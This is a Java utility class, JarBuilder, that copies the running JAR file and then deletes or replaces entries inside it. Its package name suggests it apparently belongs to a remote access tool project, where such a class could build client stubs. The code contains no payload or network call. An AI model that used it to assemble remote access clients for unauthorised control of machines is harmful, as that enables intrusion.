/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.util;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Set;

public final class JarBuilder {
	
	private Path destination;
	
	private ArrayList<String> removals;
	private HashMap<String, byte[]> replacements;
	
	public JarBuilder(final Path destination) {
		this.destination = destination;
		
		removals = new ArrayList<String>();
		replacements = new HashMap<String, byte[]>();
	}
	
	public JarBuilder(final String destination) {
		this(Paths.get(destination));
	}
	
	public JarBuilder removeFiles(final String... paths) {
		for (final String removal : paths) {
			removals.add(removal);
		}
		
		return this;
	}
	
	public JarBuilder replaceFile(final String path, final byte[] data) {
		replacements.put(path, data);
		
		return this;
	}
	
	public void build() throws IOException {
		final Path sourcePath = Constants.JAR_FILE;
		
		Files.copy(sourcePath, destination, StandardCopyOption.REPLACE_EXISTING);
		
		final FileSystem fileSystem = FileSystems.newFileSystem(destination, null);
		final Set<String> replacementKeys = replacements.keySet();
		
		for (final String removal : removals) {
			final Path path = fileSystem.getPath(removal);
			
			Files.delete(path);
		}
		
		for (final String replacement : replacementKeys) {
			final Path path = fileSystem.getPath(replacement);
			final byte[] data = replacements.get(replacement);
			final ByteArrayInputStream in = new ByteArrayInputStream(data);
			
			Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
			
			in.close();
		}
		
		fileSystem.close();
	}
	
}
